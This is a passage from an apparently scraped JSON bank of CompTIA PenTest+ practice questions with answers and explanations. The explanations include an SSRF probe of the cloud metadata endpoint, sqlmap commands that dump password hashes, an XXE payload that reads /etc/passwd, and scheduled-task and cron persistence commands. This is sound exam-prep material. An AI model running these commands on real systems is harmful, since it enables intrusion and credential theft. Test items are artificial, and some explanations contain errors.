      "explanation": "In a cloud environment, testing for Server-Side Request Forgery (SSRF) vulnerabilities involves attempting to \naccess metadata services. Here’s why the specified command is appropriate:\n\nAccessing Cloud Metadata Service:\n\nURL:\nhttp://169.254.169.254/latest/meta-data/ is a well-known endpoint in cloud environments (e.g., \nAWS) to access instance metadata.\n\nPurpose: By exploiting SSRF to access this URL, an attacker can retrieve sensitive information \nsuch as instance credentials and other metadata.\n\nComparison with Other Commands:\n\n127.0.0.1/etc/passwd: This is more about local file inclusion, not specific to cloud metadata.\n\n<script>alert(1)</script>: This tests for XSS, not SSRF.\n\n127.0.0.1: This is a generic loopback address and does not specifically test for metadata access in \na cloud environment.\n\nUsing curl <url>?param=http://169.254.169.254/latest/meta-data/\nis the correct approach to test for SSRF vulnerabilities in cloud environments to potentially expose secrets.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 24,
      "question_text": "During a security audit, a penetration tester wants to run a process to gather information about a target network's domain structure and associated IP addresses. Which of the following tools should the tester use?",
      "options": {
        "A": "Dnsenum",
        "B": "Nmap",
        "C": "Netcat",
        "D": "Wireshark"
      },
      "correct_answer": "A",
      "explanation": "Dnsenum is a tool specifically designed to gather information about DNS, including domain structure and \nassociated IP addresses. Here’s why option A is correct:\n\nDnsenum: This tool is used for DNS enumeration and can gather information about a domain’s DNS \nrecords, subdomains, IP addresses, and other related information. It is highly effective for mapping out \na target network’s domain structure.\n\nNmap: While a versatile network scanning tool, Nmap is more focused on port scanning and service \ndetection rather than detailed DNS enumeration.\n\nNetcat: This is a network utility for reading and writing data across network connections, not for DNS \nenumeration.\n\nWireshark: This is a network protocol analyzer used for capturing and analyzing network traffic but not \nspecifically for gathering DNS information.\n\nReferences from Pentest:\n\nAnubis HTB: Shows the importance of using DNS enumeration tools like Dnsenum to gather detailed \ninformation about the target’s domain structure.\n\nForge HTB: Demonstrates the process of using specialized tools to collect DNS and IP information \nefficiently.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 66,
      "question_text": "Which of the following could be used to enhance the quality and reliability of a vulnerability scan report?",
      "options": {
        "A": "Risk analysis",
        "B": "Peer review",
        "C": "Root cause analysis",
        "D": "Client acceptance"
      },
      "correct_answer": "B",
      "explanation": "A peer review ensures the accuracy, completeness, and objectivity of a penetration test report.\n\nOption A (Risk analysis) #: Helps prioritize vulnerabilities but does not validate report accuracy.\n\nOption B (Peer review) #: Correct.\n\nEnsures report accuracy and consistency.\n\nIdentifies misinterpretations or missing details.\n\nOption C (Root cause analysis) #: Helps in remediation but does not verify report quality.\n\nOption D (Client acceptance) #: A client review is final verification, but peer review happens earlier to \nensure accuracy.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Reporting & Quality Assurance",
      "is_simulation": false,
      "domain": "1.0 Engagement Management",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 152,
      "question_text": "Which of the following elements in a lock should be aligned to a specific level to allow the key cylinder to turn?",
      "options": {
        "A": "Latches",
        "B": "Pins",
        "C": "Shackle",
        "D": "Plug"
      },
      "correct_answer": "B",
      "explanation": "In a pin tumbler lock, the key interacts with a series of pins within the lock cylinder. Here’s a detailed \nbreakdown:\n\nComponents of a Pin Tumbler Lock:\n\nKey Pins: These are the pins that the key directly interacts with. The cuts on the key align these \npins.\n\nDriver Pins: These are pushed by the springs and sit between the key pins and the springs.\n\nSprings: These apply pressure to the driver pins.\n\nPlug: This is the part of the lock that the key is inserted into and turns when the correct key is \nused.\n\nCylinder: The housing for the plug and the pins.\n\nOperation:\n\nWhen the correct key is inserted, the key pins are pushed up by the key’s cuts to align with the \nshear line (the gap between the plug and the cylinder).\n\nThe alignment of the pins at the shear line allows the plug to turn, thereby operating the lock.\n\nWhy Pins Are the Correct Answer:\n\nThe correct key aligns the key pins and driver pins to the shear line, allowing the plug to turn. If \nany pin is not correctly aligned, the lock will not open.\n\nIllustration in Lock Picking:\n\nLock picking involves manipulating the pins so they align at the shear line without the key. This \ndemonstrates the critical role of pins in the functioning of the lock.\n=================",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 18,
      "question_text": "While conducting an assessment, a penetration tester identifies details for several unreleased products announced at a company-wide meeting.\nWhich of the following attacks did the tester most likely use to discover this information?",
      "options": {
        "A": "Eavesdropping",
        "B": "Bluesnarfing",
        "C": "Credential harvesting",
        "D": "SQL injection attack"
      },
      "correct_answer": "A",
      "explanation": "The tester gained information by listening to a private discussion, which is eavesdropping (passive \nreconnaissance).\n\nOption A (Eavesdropping) #: Correct.\n\nInvolves intercepting conversations via audio, network traffic, or wireless signals.\n\nOption B (Bluesnarfing) #: Stealing data via Bluetooth, which is not mentioned.\n\nOption C (Credential harvesting) #: No password collection occurred.\n\nOption D (SQL injection) #: SQLi affects databases, not voice communications.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – OSINT & Eavesdropping Techniques",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 37,
      "question_text": "A penetration tester performs a service enumeration process and receives the following result after scanning a server using the Nmap tool:\nbash\nPORT STATE SERVICE\n22/tcp open ssh\n25/tcp filtered smtp\n111/tcp open rpcbind\n2049/tcp open nfs\nBased on the output, which of the following services provides the best target for launching an attack?",
      "options": {
        "A": "Database",
        "B": "Remote access",
        "C": "Email",
        "D": "File sharing"
      },
      "correct_answer": "D",
      "explanation": "From the Nmap results:\n\nService Analysis:\n\nSSH (22): Secure Shell is a remote access protocol that is typically well-secured with encryption \nand authentication mechanisms. It’s not the easiest to exploit without valid credentials or known \nvulnerabilities.\n\nSMTP (25): The port is filtered, which indicates that it might be blocked by a firewall, making it \nless accessible as an attack vector.\n\nRPCBind (111): RPC services can sometimes expose vulnerabilities, but they are less common in \nmodern systems.\n\nNFS (2049): Network File System is a file-sharing service. Misconfigured NFS servers often \nexpose sensitive files or directories that can be accessed without proper authentication.\n\nBest Target:NFS (port 2049) is the most attractive target. Attackers can exploit insecure exports, gain \nunauthorized access to shared directories, or elevate privileges if the server allows root access over NFS.\n\nCompTIA Pentest+ References:\n\nDomain 2.0 (Information Gathering and Vulnerability Identification)\n\nDomain 3.0 (Attacks and Exploits)",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 116,
      "question_text": "During an assessment, a penetration tester exploits an SQLi vulnerability. Which of the following commands would allow the penetration tester to enumerate password hashes?",
      "options": {
        "A": "sqlmap -u www.example.com/?id=1 --search -T user",
        "B": "sqlmap -u www.example.com/?id=1 --dump -D accounts -T users -C cred",
        "C": "sqlmap -u www.example.com/?id=1 --tables -D accounts",
        "D": "sqlmap -u www.example.com/?id=1 --schema --current-user --current-db"
      },
      "correct_answer": "B",
      "explanation": "To enumerate password hashes using an SQL injection vulnerability, the penetration tester needs to extract \nspecific columns from the database that typically contain password hashes. The --dump command in sqlmap \nis used to dump the contents of the specified database table. Here’s a breakdown of the options:\n\nOption A: sqlmap -u www.example.com/?id=1 --search -T user\n\nThe --search option is used to search for columns and not to dump data. This would not \nenumerate password hashes.\n\nOption B: sqlmap -u www.example.com/?id=1 --dump -D accounts -T users -C cred\n\nThis command uses --dump to extract data from the specified database accounts, table users, and \ncolumn cred. This is the correct option to enumerate password hashes, assuming cred is the \ncolumn containing the password hashes.\n\nOption C: sqlmap -u www.example.com/?id=1 --tables -D accounts\n\nThe --tables option lists all tables in the specified database but does not extract data.\n\nOption D: sqlmap -u www.example.com/?id=1 --schema --current-user --current-db\n\nThe --schema option provides the database schema information, and --current-user and --current-\ndb provide information about the current user and database but do not dump data.\n\nReferences from Pentest:\n\nWriteup HTB: Demonstrates using sqlmap to dump data from specific tables to retrieve sensitive \ninformation, including password hashes.\n\nLuke HTB: Shows the process of exploiting SQL injection to extract user credentials and hashes by \ndumping specific columns from the database.\n=================",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 164,
      "question_text": "A penetration tester is performing an authorized physical assessment. During the test, the tester observes an access control vestibule and on-site security guards near the entry door in the lobby. Which of the following is the best attack plan for the tester to use in order to gain access to the facility?",
      "options": {
        "A": "Clone badge information in public areas of the facility to gain access to restricted areas.",
        "B": "Tailgate into the facility during a very busy time to gain initial access.",
        "C": "Pick the lock on the rear entrance to gain access to the facility and try to gain access.",
        "D": "Drop USB devices with malware outside of the facility in order to gain access to internal machines."
      },
      "correct_answer": "B",
      "explanation": "In an authorized physical assessment, the goal is to test physical security controls. Tailgating is a common and \neffective technique in such scenarios. Here’s why option B is correct:\n\nTailgating: This involves following an authorized person into a secure area without proper credentials. \nDuring busy times, it’s easier to blend in and gain access without being noticed. It tests the \neffectiveness of physical access controls and security personnel.\n\nCloning Badge Information: This can be effective but requires proximity to employees and specialized \nequipment, making it more complex and time-consuming.\n\nPicking Locks: This is a more invasive technique that carries higher risk and is less stealthy compared \nto tailgating.\n\nDropping USB Devices: This tests employee awareness and response to malicious devices but does not \ndirectly test physical access controls.\n\nReferences from Pentest:\n\nWriteup HTB: Demonstrates the effectiveness of social engineering and tailgating techniques in \nbypassing physical security measures.\n\nForge HTB: Highlights the use of non-invasive methods like tailgating to test physical security without \ncausing damage or raising alarms.\n\nConclusion:\n\nOption B, tailgating into the facility during a busy time, is the best attack plan to gain access to the facility in \nan authorized physical assessment.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 77,
      "question_text": "A tester wants to pivot from a compromised host to another network with encryption and the least amount of interaction with the compromised host. Which of the following is the best way to accomplish this objective?",
      "options": {
        "A": "Create an SSH tunnel using sshuttle to forward all the traffic to the compromised computer.",
        "B": "Configure a VNC server on the target network and access the VNC server from the compromised computer.",
        "C": "Set up a Metasploit listener on the compromised computer and create a reverse shell on the target network.",
        "D": "Create a Netcat connection to the compromised computer and forward all the traffic to the target network."
      },
      "correct_answer": "A",
      "explanation": "Pivoting allows attackers to use a compromised host as a gateway to access internal resources.\n\nCreate an SSH tunnel using sshuttle (Option A):\n\nsshuttle creates a transparent VPN-like connection over SSH, allowing the tester to forward \ntraffic securely.\n\nAdvantages:\n\nProvides encryption, preventing IDS/IPS detection.\n\nRequires minimal interaction with the compromised host.",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 214,
      "question_text": "A client warns the assessment team that an ICS application is maintained by the manufacturer. Any tampering of the host could void the enterprise support terms of use.\nWhich of the following techniques would be most effective to validate whether the application encrypts communications in transit?",
      "options": {
        "A": "Utilizing port mirroring on a firewall appliance",
        "B": "Installing packet capture software on the server",
        "C": "Reconfiguring the application to use a proxy",
        "D": "Requesting that certificate pinning be disabled"
      },
      "correct_answer": "A",
      "explanation": "Since direct interaction with the ICS application is restricted, the best way to analyze network traffic without \nmodifying the system is to use port mirroring on a firewall or network switch.\n\nOption A (Port mirroring) #:\n\nCorrect. Port mirroring (SPAN) copies network traffic without modifying the host system.\n\nAllows passive analysis of whether encryption is used.\n\nOption B (Packet capture on the server) #:\n\nRequires modifying the host, which is prohibited by the client.\n\nOption C (Reconfiguring the app to use a proxy) #:\n\nModifies application settings, which violates the client’s terms.\n\nOption D (Disabling certificate pinning) #:\n\nRequires changes to security settings, which is not allowed in this scenario.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Passive Traffic Analysis for ICS Systems",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 49,
      "question_text": "A penetration tester needs to obtain sensitive data from several executives who regularly work while commuting by train. Which of the following methods should the tester use for this task?",
      "options": {
        "A": "Shoulder surfing",
        "B": "Credential harvesting",
        "C": "Bluetooth spamming",
        "D": "MFA fatigue"
      },
      "correct_answer": "A",
      "explanation": "Shoulder surfing es el método más efectivo en este contexto. Cuando los ejecutivos trabajan en lugares \npúblicos como trenes, un atacante puede visualizar sus pantallas sin ser detectado para recopilar datos \nconfidenciales.\nCredential harvesting requiere phishing o explotación directa. Bluetooth spamming y MFA fatigue no aplican \ndirectamente en un entorno de observación física.\nReferencia: PT0-003 Objective 2.1 – Social engineering and physical observation methods.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 102,
      "question_text": "Which of the following methods should a physical penetration tester employ to access a rarely used door that has electronic locking mechanisms?",
      "options": {
        "A": "Lock picking",
        "B": "Impersonating",
        "C": "Jamming",
        "D": "Tailgating",
        "E": "Bypassing"
      },
      "correct_answer": "E",
      "explanation": "For electronic locking mechanisms, traditional lock picking is ineffective. Instead, bypassing techniques are \noften used, such as:\n\nTriggering the emergency release.\n\nUsing a shim or bypass tool.\n\nExploiting wiring faults or RFID vulnerabilities.\n\nThis method doesn’t involve human deception (impersonation), social engineering (tailgating), or causing \ninterference (jamming). It focuses on exploiting the electronic door system without needing to \"unlock\" it \ntraditionally.\n\nCompTIA PenTest+ Reference:\n\nPT0-003 Objective 1.3: Given a scenario, perform a physical assessment.\n\nCompTIA emphasizes the distinction between bypassing and other physical intrusion methods.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 53,
      "question_text": "As part of an engagement, a penetration tester wants to maintain access to a compromised system after rebooting. Which of the following techniques would be best for the tester to use?",
      "options": {
        "A": "Establishing a reverse shell",
        "B": "Executing a process injection attack",
        "C": "Creating a scheduled task",
        "D": "Performing a credential-dumping attack"
      },
      "correct_answer": "C",
      "explanation": "To maintain access to a compromised system after rebooting, a penetration tester should create a scheduled \ntask. Scheduled tasks are designed to run automatically at specified times or when certain conditions are met, \nensuring persistence across reboots.\n\nPersistence Mechanisms:\n\nScheduled Task: Creating a scheduled task ensures that a specific program or script runs \nautomatically according to a set schedule or in response to certain events, including system \nstartup. This makes it a reliable method for maintaining access after a system reboot.\n\nReverse Shell: While establishing a reverse shell provides immediate access, it typically does not \nsurvive a system reboot unless coupled with another persistence mechanism.\n\nProcess Injection: Injecting a malicious process into another running process can provide stealthy \naccess but may not persist through reboots.\n\nCredential Dumping: Dumping credentials allows for re-access by using stolen credentials, but it \ndoes not ensure automatic access upon reboot.\n\nCreating a Scheduled Task:\n\nOn Windows, the schtasks command can be used to create scheduled tasks. For example:\nschtasks /create /tn \"Persistence\" /tr \"C:\\path\\to\\malicious.exe\" /sc onlogon /ru SYSTEM\n\nOn Linux, a cron job can be created by editing the crontab:\n(crontab -l; echo \"@reboot /path/to/malicious.sh\") | crontab -\n\nPentest References:\n\nMaintaining persistence is a key objective in post-exploitation. Scheduled tasks (Windows Task \nScheduler) and cron jobs (Linux) are commonly used techniques.\n\nReferences to real-world scenarios include creating scheduled tasks to execute malware, \nkeyloggers, or reverse shells automatically on system startup.\n\nBy creating a scheduled task, the penetration tester ensures that their access method (e.g., reverse shell, \nmalware) is executed automatically whenever the system reboots, providing reliable persistence.\n=================",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 21,
      "question_text": "A penetration tester writes a Bash script to automate the execution of a ping command on a Class C network:\nfor var in --MISSING TEXT-- do\nping -c 1 192.168.10.$var\ndone\nWhich of the following pieces of code should the penetration tester use in place of —MISSING TEXT—?",
      "options": {
        "A": "crunch 1 254 loop",
        "B": "seq 1 254",
        "C": "echo 1-254",
        "D": "fl..254"
      },
      "correct_answer": "B",
      "explanation": "The seq command generates a sequence of numbers, making it the best choice for iterating through IP \naddresses in a Class C subnet.\n\nOption A (crunch) #: Crunch generates wordlists, not IP ranges.\n\nOption B (seq 1 254) #: Correct. Generates the range 1-254 for a Class C subnet.\n\nOption C (echo 1-254) #: Outputs the string \"1-254\" instead of expanding it into numbers.\n\nOption D (fl..254) #: Incorrect syntax.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Bash Scripting for Automation",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 143,
      "question_text": "A penetration tester is preparing a password-spraying attack against a known list of users for the company \"example\". The tester is using the following list of commands:\n1. `pw-inspector -i sailwords -t 8 -S pass`\n2. `spray365.py spray -ep plan`\n3. `users=\"~/user.txt\"; allwords=\"~/words.txt\"; pass=\"~/passwords.txt\"; plan=\"~/spray.plan\"`\n4. `spray365.py generate --password-file $pass --userfile $user --domain \"example.com\" --execution-plan $plan`\n5. `cew -m 5 \"http://www.example.com\" -w sailwords`\nWhich of the following is the correct order for the list of the commands?",
      "options": {
        "A": "3, 4, 1, 2, 5",
        "B": "3, 1, 2, 5, 4",
        "C": "2, 3, 1, 4, 5",
        "D": "3, 5, 1, 4, 2"
      },
      "correct_answer": "D",
      "explanation": "Let's break it down in order:\n\nStep 3: Sets environment variables (paths to user list, password list, etc.).\nStep 5: Generates potential passwords (`sailwords`) using CeWL by crawling the website.\nStep 1: Filters the generated password list (`sailwords`) using pw-inspector to enforce a minimum password policy, outputting to the file path specified by `$pass` (e.g., ~/passwords.txt).\nStep 4: Generates the execution plan (`$plan`) using spray365.py generate with the user list (`$user`) and the filtered password list (`$pass`).\nStep 5: Executes the password spraying using the generated plan (`$plan`).\n\nThe correct logical order of operations is 3, 5, 1, 4, 2 which matches option D.\n\nCompTIA PenTest+ Reference:\n\nPT0-003 Objective 2.3: Perform password attacks.\n\nKali tools & scripts usage and scripting logic are core elements in PenTest+ methodology.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 84,
      "question_text": "A penetration tester needs to exploit a vulnerability in a wireless network that has weak encryption to perform traffic analysis and decrypt sensitive information. Which of the following techniques would best allow the penetration tester to have access to the sensitive information?",
      "options": {
        "A": "Bluejacking",
        "B": "SSID spoofing",
        "C": "Packet sniffing",
        "D": "ARP poisoning"
      },
      "correct_answer": "C",
      "explanation": "If a wireless network uses weak encryption (e.g., WEP), attackers can capture and analyze packets to extract \nsensitive data.\n\nPacket sniffing (Option C):\n\nTools like Wireshark, Aircrack-ng, and Kismet capture network packets.\n\nAttackers analyze captured traffic to decrypt WEP encryption or extract plaintext credentials.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 55,
      "question_text": "A penetration tester identifies the URL for an internal administration application while following DevOps team members on their commutes. Which of the following attacks did the penetration tester most likely use?",
      "options": {
        "A": "Shoulder surfing",
        "B": "Dumpster diving",
        "C": "Spear phishing",
        "D": "Tailgating"
      },
      "correct_answer": "A",
      "explanation": "La técnica utilizada en este escenario es Shoulder Surfing, que consiste en observar directamente a una \npersona mientras trabaja, con el objetivo de recopilar información sensible, como credenciales, direcciones \nURL internas u otros datos confidenciales.\nEn este caso, el pentester siguió a los miembros del equipo DevOps durante sus desplazamientos (commute) y \nlogró identificar una URL interna. No se usó ingeniería social directa (como en spear phishing), ni acceso \nfísico no autorizado (como en tailgating), ni revisión de basura (dumpster diving).\nReferencia: PT0-003 Objective 2.1 - Explain the importance of physical security assessments. Shoulder \nsurfing is listed as a key social engineering technique.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 75,
      "question_text": "A penetration tester performs an assessment on the target company's Kubernetes cluster using kube-hunter. Which of the following types of vulnerabilities could be detected with the tool?",
      "options": {
        "A": "Network configuration errors in Kubernetes services",
        "B": "Weaknesses and misconfigurations in the Kubernetes cluster",
        "C": "Application deployment issues in Kubernetes",
        "D": "Security vulnerabilities specific to Docker containers"
      },
      "correct_answer": "B",
      "explanation": "kube-hunter is a tool designed to perform security assessments on Kubernetes clusters. It identifies various \nvulnerabilities, focusing on weaknesses and misconfigurations. Here’s why option B is correct:\n\nKube-hunter: It scans Kubernetes clusters to identify security issues, such as misconfigurations, \ninsecure settings, and potential attack vectors.\n\nNetwork Configuration Errors: While kube-hunter might identify some network-related issues, its \nprimary focus is on Kubernetes-specific vulnerabilities and misconfigurations.\n\nApplication Deployment Issues: These are more related to the applications running within the cluster, \nnot the cluster configuration itself.\n\nSecurity Vulnerabilities in Docker Containers: Kube-hunter focuses on the Kubernetes environment \nrather than Docker container-specific vulnerabilities.\n\nReferences from Pentest:\n\nForge HTB: Highlights the use of specialized tools to identify misconfigurations in environments, \nsimilar to how kube-hunter operates within Kubernetes clusters.\n\nAnubis HTB: Demonstrates the importance of identifying and fixing misconfigurations within complex \nenvironments like Kubernetes clusters.\n\nConclusion:\n\nOption B, weaknesses and misconfigurations in the Kubernetes cluster, accurately describes the type of \nvulnerabilities that kube-hunter is designed to detect.\n=================",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 76,
      "question_text": "A penetration tester obtains password dumps associated with the target and identifies strict lockout policies. The tester does not want to lock out accounts when attempting access. Which of the following techniques should the tester use?",
      "options": {
        "A": "Credential stuffing",
        "B": "MFA fatigue",
        "C": "Dictionary attack",
        "D": "Brute-force attack"
      },
      "correct_answer": "A",
      "explanation": "To avoid locking out accounts while attempting access, the penetration tester should use credential stuffing.\n\nCredential Stuffing:\n\nDefinition: An attack method where attackers use a list of known username and password pairs, \ntypically obtained from previous data breaches, to gain unauthorized access to accounts.\n\nAdvantages: Unlike brute-force attacks, credential stuffing uses already known credentials, which \nreduces the number of attempts per account and minimizes the risk of triggering account lockout \nmechanisms.\n\nTool: Tools like Sentry MBA, Snipr, and others are commonly used for credential stuffing attacks.\n\nOther Techniques:\n\nMFA Fatigue: A social engineering tactic to exhaust users into accepting multi-factor \nauthentication requests, not applicable for avoiding lockouts in this context.\n\nDictionary Attack: Similar to brute-force but uses a list of likely passwords; still risks lockout due \nto multiple attempts.\n\nBrute-force Attack: Systematically attempts all possible password combinations, likely to trigger \naccount lockouts due to high number of failed attempts.\n\nPentest References:\n\nPassword Attacks: Understanding different types of password attacks and their implications on account \nsecurity.\n\nAccount Lockout Policies: Awareness of how lockout mechanisms work and strategies to avoid \ntriggering them during penetration tests.\n\nBy using credential stuffing, the penetration tester can attempt to gain access using known credentials without \ntriggering account lockout policies, ensuring a stealthier approach to password attacks.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 34,
      "question_text": "A penetration tester finds that an application responds with the contents of the /etc/passwd file when the following payload is sent:\nxml\nCopy code\n<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ENTITY foo SYSTEM \"file:///etc/passwd\" >\n]>\n<test>&foo;</test>\nWhich of the following should the tester recommend in the report to best prevent this type of vulnerability?",
      "options": {
        "A": "Drop all excessive file permissions with chmod o-rwx.",
        "B": "Ensure the requests application access logs are reviewed frequently.",
        "C": "Disable the use of external entities.",
        "D": "Implement a WAF to filter all incoming requests."
      },
      "correct_answer": "C",
      "explanation": "The vulnerability in question is XML External Entity (XXE) injection, which occurs when an application \nprocesses XML input containing external entities that access files on the server or external resources.\n\nDisabling External Entities:\n\nThe root cause of the issue is the application's ability to process external entities (<!ENTITY foo \nSYSTEM ...>). Disabling external entities entirely prevents XXE attacks.\n\nThis can be achieved by properly configuring the XML parser (e.g., in Java, disable \nDocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", \ntrue)).\n\nWhy Not Other Options?\n\nA (chmod o-rwx): File permission hardening may reduce the impact of a successful attack but \ndoes not mitigate XXE at the parser level.\n\nB (Review logs): Reviewing logs is a reactive measure, not a prevention mechanism.\n\nD (WAF): A WAF may block some malicious requests but is not a reliable mitigation for XXE \nvulnerabilities embedded in legitimate XML input.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)\n\nOWASP XXE Prevention Cheat Sheet",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 10,
      "question_text": "A penetration tester would like to leverage a CSRF vulnerability to gather sensitive details from an application's end users. Which of the following tools should the tester use for this task?",
      "options": {
        "A": "Browser Exploitation Framework",
        "B": "Maltego",
        "C": "Metasploit",
        "D": "theHarvester"
      },
      "correct_answer": "A",
      "explanation": "Cross-Site Request Forgery (CSRF) vulnerabilities can be leveraged to trick authenticated users into \nperforming unwanted actions on a web application. The right tool for this task would help in exploiting web-\nbased vulnerabilities, particularly those related to web browsers and interactions.\n\nBrowser Exploitation Framework (BeEF) (Answer: A):\n\nExplanation: BeEF is a powerful tool specifically designed for exploiting web browser \nvulnerabilities. It can hook web browsers and perform a wide range of attacks, including CSRF.\n\nCapabilities: BeEF is equipped with modules to create CSRF attacks, capture session tokens, and \ngather sensitive information from the target user's browser session.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 41,
      "question_text": "A penetration tester cannot find information on the target company's systems using common OSINT methods. The tester's attempts to do reconnaissance against internet-facing resources have been blocked by the company's WAF. Which of the following is the best way to avoid the WAF and gather information about the target company's systems?",
      "options": {
        "A": "HTML scraping",
        "B": "Code repository scanning",
        "C": "Directory enumeration",
        "D": "Port scanning"
      },
      "correct_answer": "B",
      "explanation": "When traditional reconnaissance methods are blocked, scanning code repositories is an effective method to \ngather information. Here’s why:\n\nCode Repository Scanning:\n\nLeaked Information: Code repositories (e.g., GitHub, GitLab) often contain sensitive information, \nincluding API keys, configuration files, and even credentials that developers might inadvertently \ncommit.\n\nAccessible: These repositories can often be accessed publicly, bypassing traditional defenses like \nWAFs.\n\nComparison with Other Methods:\n\nHTML Scraping: Limited to the data present on web pages and can still be blocked by WAF.\n\nDirectory Enumeration: Likely to be blocked by WAF as well and might not yield significant \ninternal information.\n\nPort Scanning: Also likely to be blocked or trigger alerts on WAF or IDS/IPS systems.\n\nScanning code repositories allows gathering a wide range of information that can be critical for further \npenetration testing effort\n=================",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 165,
      "question_text": "A penetration tester is attempting to discover vulnerabilities in a company's web application. Which of the following tools would most likely assist with testing the security of the web application?",
      "options": {
        "A": "OpenVAS",
        "B": "Nessus",
        "C": "sqlmap",
        "D": "Nikto"
      },
      "correct_answer": "D",
      "explanation": "When testing the security of a web application, specific tools are designed to uncover vulnerabilities and \nissues. Here’s an overview of the tools mentioned and why Nikto is the most suitable for this task:\n\nNikto:\n\nPurpose: Nikto is a web server scanner that performs comprehensive tests against web servers for \nmultiple items, including potentially dangerous files/programs, outdated versions, and other \nsecurity issues.\n\nRelevance: It is designed specifically for discovering vulnerabilities in web applications, making \nit the most appropriate choice for a penetration tester targeting a web application.\n\nComparison with Other Tools:\n\nOpenVAS: A general-purpose vulnerability scanner that targets a wide range of network services \nand hosts, not specifically tailored for web applications.\n\nNessus: Similar to OpenVAS, Nessus is a comprehensive vulnerability scanner but is broader in \nscope and not focused solely on web applications.\n\nsqlmap: This tool is excellent for SQL injection testing but is limited to database vulnerabilities \nand doesn’t cover the full spectrum of web application security issues.\n=================",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 181,
      "question_text": "A penetration tester gains access to a domain server and wants to enumerate the systems within the domain. Which of the following tools would provide the best oversight of domains?",
      "options": {
        "A": "Netcat",
        "B": "Wireshark",
        "C": "Nmap",
        "D": "Responder"
      },
      "correct_answer": "C",
      "explanation": "Installation:\n\nNmap can be installed on various operating systems. For example, on a Debian-based system:\nsudo apt-get install nmap\n\nBasic Network Scanning:\n\nTo scan a range of IP addresses in the network:\nnmap -sP 192.168.1.0/24\n\nService and Version Detection:\n\nTo scan for open ports and detect the service versions running on a specific host:\nnmap -sV 192.168.1.10\n\nEnumerating Domain Systems:\n\nUse Nmap with additional scripts to enumerate domain systems. For example, using the --script \noption:\nnmap -p 445 --script=smb-enum-domains 192.168.1.10\n\nAdvanced Scanning Options:\n\nStealth Scan: Use the -sS option to perform a stealth scan:\nnmap -sS 192.168.1.10\n\nAggressive Scan: Use the -A option to enable OS detection, version detection, script scanning, \nand traceroute:\nnmap -A 192.168.1.10\n\nReal-World Example:\n\nA penetration tester uses Nmap to enumerate the systems within a domain by scanning the \nnetwork for live hosts and identifying the services running on each host. This information helps \nin identifying potential vulnerabilities and entry points for further exploitation.\n\nReferences from Pentesting Literature:\n\nIn \"Penetration Testing - A Hands-on Introduction to Hacking,\" Nmap is extensively discussed \nfor various stages of the penetration testing process, from reconnaissance to vulnerability \nassessment.\n\nHTB write-ups often illustrate the use of Nmap for network enumeration and discovering \npotential attack vectors.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 216,
      "question_text": "A penetration tester executes multiple enumeration commands to find a path to escalate privileges. Given the following command:\nfind / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null\nWhich of the following is the penetration tester attempting to enumerate?",
      "options": {
        "A": "Attack path mapping",
        "B": "API keys",
        "C": "Passwords",
        "D": "Permission"
      },
      "correct_answer": "D",
